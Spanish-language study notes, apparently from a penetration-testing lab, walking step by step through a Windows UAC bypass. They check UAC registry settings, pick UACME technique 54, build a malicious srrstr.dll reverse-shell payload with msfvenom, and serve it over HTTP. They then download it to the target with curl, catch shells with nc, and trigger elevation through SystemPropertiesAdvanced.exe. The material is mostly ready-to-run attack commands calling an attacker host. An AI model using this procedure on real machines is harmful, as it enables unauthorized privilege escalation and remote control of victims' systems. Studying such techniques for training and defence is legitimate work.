
Es una caracteristica que habilita un aviso de consentimiento para actividades con privilegios. Cuando UAC esta habilitado, las aplicaciones y tareas se ejecutan bajo el contexto de seguridad de una cuenta sin privs a menos que se autorice explicitamente

Cuando nos logueamos como usuario estandar los procesos se inician con el token de usuario estandar. UAC puede proporcionar derechos de acceso adicionales al token para que se ejecuten los procesos que necesitan privs elevados

![[Pasted image 20260911150030.png]]

Aunque de por si no impida la ejecucion con privs altos, si hace mas ruidosa la ejecucion

La cuenta `Administrator RID 500 predeterminada` siempre opera en el nivel obligatorio `alto`
Si el Modo de Aprobacion de Administrador AAM esta habilitado, cualquier nueva cuenta administrador que creemos operara en el nivel obligatorio `medio` por defecto

1. Confirmando que UAC esta habilitado

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
![[Pasted image 20260911150506.png]]

	Desde linea de comandos no existe un aviso de consentimiento UAC por lo que tendremos que eludirlo

2. Comprobando el nivel UAC

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
![[Pasted image 20260911150607.png]]

	El valor `ConsentPromptBehaviorAdmin` es `0x5`, lo que significa que el nivel más alto de UAC, `Notificar siempre` (Always notify). En este nivel hay menos evasiones


3. Comprobamos la version de Windows:

```
[environment]::OSVersion.Version
```
![[Pasted image 20260911150712.png]]

Nos devuelve la version de compilacion. En [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) pagina podemos cruzar con la version Windows 1607:

![[Pasted image 20260911150759.png]]



[UACME](https://github.com/hfiref0x/UACME): lista de evasiones de UAC que incluye informacion sobre el numero de compilacion, tecnica usada y si hay parche de Microsoft. En nuestro caso usaremos la tecnica 54:

- En esta usaremos la version de 32 bits del binario SystemPropertiesAdvanced.exe. Hay muchos binarios que Windows permite que se autoeleven sin pasar por UAC. Este binario carga una dll inexistente `srrstr.dll` que se usa para Restaurar el sistema. Para localizar la dll Windows usa el siguiente nivel de busqueda:
	- Directorio desde el cual se cargo la aplicacion
	- Directorio del sistema C:\Windows\System32 para sistemas 64bits
	- Directorio del sistema de 16bits C:\Windows\System
	- Directorio de Windows
	- Cualquier directorio que este listado en la variable PATH

4. Revisamos la variable PATH:

```
cmd /c echo %PATH%
```
![[Pasted image 20260911151245.png]]


5. Realizaremos un DLL hijacking cargando una DLL `srrstr.dll` maliciosa en WindowsApps del directorio de Sarah

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```
![[Pasted image 20260911151513.png]]

6. Iniciamos el servidor HTTP

```
sudo python3 -m http.server 8080
```


7. Lo descargamos en el objetivo

```
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

8. Iniciamos el listener

```
nc -lvnp 8443
```

9. Ejecutamos la dll maliciosa como prueba para ver si nos devuelve la shell:

```
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

10. Obtenemos la shell con privs normales

```
nc -lnvp 8443
```
![[Pasted image 20260911151726.png]]


11. De vuelta al objetivo eliminaremos las instancias del proceso rundll32 de la ejecucion anterior:

```
tasklist /svc | findstr "rundll32"
taskkill /PID NNNN /F
```
![[Pasted image 20260911152043.png]]

12. Ejecutamos SystemPropertiesAdvanced.exe que bypassea el UAC y ejecuta nuestra dll maliciosa:

```
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

13. Deberiamos recibir una shell con privs elevados en el listener anterior:

![[Pasted image 20260911152148.png]]
